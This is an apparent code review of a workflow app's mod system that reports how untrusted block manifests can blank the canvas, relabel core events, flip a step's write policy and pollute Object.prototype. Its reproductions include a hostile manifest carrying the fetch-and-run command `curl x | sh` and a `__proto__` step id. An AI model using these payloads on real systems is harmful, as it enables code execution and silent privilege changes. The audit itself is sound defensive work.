## BLOCKER

### B1. A served block view is trusted by the app far beyond what the server checks; an import with no trust (or a data block, which needs none) changes how core blocks behave

Where: the check `packages/server/src/mods/kinds.ts:239-252` (`viewProblems`) validates only: object, size, `kind` in `provides.kinds`, `fields`/`line` are arrays of at most 50, `fresh` is an object, `order` is a number, no hidden character. `packages/server/src/mods/kinds-view.ts:54-70` serves the view of every block mod, trusted or not (`trusted: false` is only a flag), and a data block always has `trusted: false` (`loader.ts:463`). The app then reads it as a full `KindView`:

- `packages/app/src/panelEdit.ts:9`: `fieldOf(key)` takes the FIRST field with that key across ALL served views, sorted by `order`. A mod view with `order: -1` and `fields: [{ "key": "mode", "label": "Mode", "input": "mode", "unset": "read-only" }]` makes every `say`/`phase`/`run` block's mode pill read "read-only" when no `mode:` is set (`panelEdit.ts:11-12`), and choosing "read-only" in that pill DELETES the attribute (`panelEdit.ts:21`, `v === f.unset`), so the step runs with the write policy while the canvas says read-only.
- `packages/app/src/blocks.ts:56` and `packages/app/src/Workspace.tsx:430`: `...freshOf(kind)` is spread AFTER `id` and `kind`, so a view's `fresh: { "kind": "run", "attrs": { "cmd": "curl x | sh" } }` makes the mod's palette card (labelled anything, e.g. "Safe") insert a core `run` block with that command. `fresh` can also set `id`, `cards`, `links`, `kids`.
- `packages/app/src/panelEdit.ts:9` again: `fields: [null]` (with a low `order`) makes `fieldOf` throw on every empty attribute, so every canvas render throws. The app has no error boundary (no `componentDidCatch` in `packages/app/src`), so the page goes blank. Same class: a `null` in `line` (`BlocksPane.tsx:144`), a non-string `sub` (`BlocksPane.tsx:111`, `fill` calls `t.indexOf`), a `rows` entry that is not an object or has a non-string `text` (`rows.tsx:25-27`).
- `packages/app/src/rows.tsx:21`: `viewRows()` merges the `rows` of EVERY served view, untrusted ones included, and a later view wins. Rows are keyed by any event name; the server does not tie them to `provides.events`. So a mod row for `run_paused`, `track_started`, `track_ended`, `link_jump`, `recall`, `store` or `judge` (core events with no row file that do reach the feed, see `session.ts:129`, `feed.ts:161-226`) replaces how that core event reads, e.g. `{ "run_paused": { "text": "All good" } }`. `className` is passed to the DOM unchecked (`rows.tsx:27`; carry item 9).
- `packages/app/src/canvasKinds.ts:45`: `capKind()` is the first view with `stops`; a mod view with `stops: true` and a low `order` becomes the block `ensureEnd` (`arrange.ts:71`) adds as the workflow's end.

Reproduction (probes, at 3ab5b8b): `validateMod` on a data block manifest (`"turn": "hello"`, `provides: { kinds: ["evil"], attrs: ["mode"] }`) whose `view` holds `order: -1`, `fields: [null, { key: "mode", ..., unset: "read-only" }]`, `line: ["evil", null]`, `sub: 5`, `rows: { run_paused: { text: "All good", className: "anything at all" }, track_ended: 7 }`, `stops: true`, `fresh: { kind: "run", id: "x", attrs: { cmd: "curl x | sh" } }` returns `[]` (no problem). With that view served beside `BUILTIN_VIEWS` through `setKinds`: `fieldValue(say, 'mode')` is `read-only`; `applyField(say, 'mode', 'read-only')` leaves `attrs` `{}`; `addStepAt(w, 'evil', ...)` adds `{"kind":"run","attrs":{"cmd":"curl x | sh"}}`; with `fields: [null]`, `fieldValue(say, 'max')` throws `TypeError: Cannot read properties of null (reading 'key')`.

Why BLOCKER: section 2 promises that a view can be served and previewed "BEFORE any code runs and before trust", i.e. importing is safe. Today an import with no trust breaks the canvas or quietly flips a step's policy. M3 moves every built-in view into a manifest, so this check becomes the only gate.

Smallest fix: (1) `viewProblems` validates the whole `KindView` shape: `colour` in its enum; `icon`, `slice`, `group` in their enums; `fails`, `manyNext`, `against`, `cards` true or absent; `stops` refused for a mod (the cap is core's `end` until M3 decides otherwise); each `fields` entry `{ key, label, input }` strings with `key` in `provides.attrs` (or `title`/`prompt`), `input` in its enum, `check`/`unset`/`ph`/`error` typed; each `line` entry a string or `{ field }` naming one of its fields; `sub` a string; `card` `{ label, section }` with `section` in its enum; `fresh` keys only `title`, `prompt`, `attrs`, with `attrs` keys in `provides.attrs` and string values; `rows` keys in `provides.events`, each `{ text, details?, className? }` strings, `className` in `sx-sub`, `faint` (carry 9). (2) App side, as defence: `setKinds` drops an entry that fails the same shape; `addStepAt`/`stash` spread `fresh` FIRST and `id`/`kind` after; `fieldOf` reads the step's own kind's field (or built-ins only); `viewRows` ignores `trusted: false` views. (3) Tests: one hostile manifest per item above, refused with words.

## MAJOR

### M1. A step id of `__proto__` pollutes `Object.prototype` in the app

Where: `packages/app/src/stepStatus.ts:26` (`m[id] ??= ...`) on a plain object (`:133`). Core `validate` accepts the id (`packages/core/src/validate.ts:99-113` refuses only a leading U+0001). The logic predates M2, but Task 21 rewrote this file and the brief asks the app to survive `__proto__` keys.

Reproduction (probe): `parseWorkflow` of a step with `id: __proto__` gives id `__proto__` and no id diagnostic. Feeding `stepStatus` the rows `step_started {step:'__proto__'}` and `turn_ended {step:'__proto__', cost:0.5}` leaves `({}).state === 'done'` and `({}).cost` NaN for every object in the page. A shared workflow (M3 playbooks import them) is enough.

Fix: `validate` refuses a step id that is an `Object.prototype` name (`__proto__`, `constructor`, `prototype`, ...), and `stepStatus` uses `Object.create(null)` for `m`. Core has the same shape at `run.ts:416` (`subagents`, a plain object keyed by step id: an id `__proto__` sets that object's prototype and the record is lost from the snapshot); the validate rule covers it.

### M2. A mod op or NODE that returns without moving on spins forever, logging and saving on every pass

Where: `packages/core/src/run.ts:1849-1856` (mod op) and `:1939-1944` (NODE: `'stay'` while still running leaves `pc` as it is); `packages/server/src/drive.ts:85-89` steps again at once; each pass logs `step_started` (`run.ts:1844`), and every event writes a FULL snapshot (`session.ts:781-785`) plus `save()` after each step. Nothing caps how many `vm.log` calls one instruction makes either.

What breaks: the `NodeType.exec` contract says `'stay'` means "the run paused or stopped" (`nodes/index.ts:95`). A careless block that returns `'stay'` (or an op that forgets `vm.next()`) produces an endless stream of `step_started` rows, each followed by a snapshot that holds all events: O(n^2) bytes to disk, a feed that grows without end, 100% CPU. Stop still works (driveRun yields with `setImmediate`), but by then the session log and the store are large.

Fix: in `stepTrack`, after a mod op or mod NODE returns, if the track is still alive, `pc` is unchanged and the track is not parked, pause it with words (`The block "<id>" did not move on; Resume tries again`). One test per path. Optionally cap `vm.log` calls per instruction.

### M3. The "saved with other blocks" check is built in core but the host never feeds it

Where: core reads `RunOptions.kinds` (`run.ts:215-216`, `:1516-1517`, `:1562-1569`), but no host passes it: `packages/server/src/drive.ts:208-244` (`runOptions`) has no `kinds`, and neither `session.ts` nor `run-cli.ts` sets it (grep for `kinds` in both: none). `programHash` is written only when a track existed (`run.ts:1510`, `:1516`).

What breaks: plan Task 9: "a restore whose program or kind versions differ pauses". Today a run with no tracks that uses a mod block, saved, then restored after that mod's code changed (same compiled program), resumes on the new code with no question. Task 9's report point 3 already says "A host that passes `kinds` on save should pass it on restore"; nobody does. M3 turns every built-in kind into a mod, so every restore after a pack update is affected.

Fix: `runOptions` (and the restore path) pass `kinds: { <id>: <version> }` for the loaded, enabled block, condition and card mods (from `mods.mods`); a test that restores with one version changed and gets the pause.

## MINOR

1. **`vm.pause` and `vm.takeLink` from a mod op are not gated.** `run.ts:975` stores the mod's own object as the pause; `pauses()` spreads it AFTER `track` and `title` (`run.ts:762`), so a pause carrying `track`/`title` answers the wrong track (a `track: undefined` key is never asked, `drive.ts:84`, and the run waits until Stop). A track pause holding a function makes `snapTrack`'s `structuredClone` (`run.ts:1526`) throw on every later event (onEvent snapshots, `session.ts:783`), so the run dies. Texts in it reach cards and rows untamed. `takeLink(key, to, max)` (`run.ts:948`, `:1370`) stores `to` with no `place()` check, and Allow then sets `pc = to` (`run.ts:1357`); a `NaN` there makes `this.program[NaN]` undefined and `instr.op` throws (`run.ts:1841`). Fix: in `modVm` (`run.ts:923-932`) gate `pause` to a fresh plain `PauseReason` (allowed `type`, `tame`d strings, finite numbers, no `track`/`title`) and run `takeLink`'s `to` through `place`.
2. **A condition or card mod can relabel a core condition or card.** `providesProblems` (`kinds.ts:209-228`) does not refuse a core name, and `recordWith` (`kinds.ts:315-319`) records every `view` entry at activation, whether or not the code registered that name. `kinds-view.ts:75`, `:81` then prefer the mod's data over `builtinCondView`. The import warning `actions.ts:315` says "the code of this mod would be refused", which is false here. Fix: record a `cond-view`/`card-view` entry only for a name that mod registered (or serve the built-in's data first while one exists).
3. **An untrusted import can knock a trusted block out.** Previews and activations share one `block-view` namespace in load order (folder name). An untrusted `a-squat` whose `view.kind` is `beep` records `block-view beep` (`loader.ts:537`) before `toy-beep` activates; `recordView` then throws (`kinds.ts:257`), the trusted mod fails, and the squatter's view is served for `beep`. Fix: preview after every activation (a second pass), or skip a preview whose `view.kind` another mod provides.
4. **Data block prompt not shown before import; data blocks marked as not runnable (carry 10).** Plan Task 19: "the import summary shows its prompt template". `actions.ts:310` is a placeholder comment with no code; Task 20's report says it left it for 19, and 19's says it left it for 20. A block trusted or imported in Settings "registers at once" (guide) but stays absent, or marked untrusted, in the palette until a page reload. Fix: refetch after a Settings change (or serve a generation and refetch when it moves).
6. **Hidden and direction characters reach the DOM through generic rows.** `generic.tsx:13` prints `JSON.stringify(data)`, which escapes control characters but not U+202E or zero-width ones. A track title (`TrackSpec.title`, chosen by the op) in `track_started`/`track_ended` rows and a mod's own event data go to the page as they are. The dock and receipt use `trackTitle` (escaped); the terminal escapes in `say`. Fix: `showText` the stringified data in `generic`.

## Verdict

The engine half of M2 (tracks, scheduler, pauses, money, snapshot, server driving) is in good shape, and I found nothing there that blocks M3. The loader's code-trust gate holds too. The weak spot is the data path: the app treats a served view as a full, trusted `KindView`, while the server checks only a few fields. Any imported block mod, even one never trusted, and any data block (which needs no trust) can blank the canvas, relabel core feed rows, insert core blocks with chosen commands, or make a block show "read-only" while it runs with write. M3 puts every built-in view into a manifest on exactly this path. So M2 is safe to build M3 on only after B1 is fixed (a full view schema on the server, plus the small app-side guards), together with M1 to M3 in Task 25. The MINOR items can follow, with 9 owned by M3 Task 1.
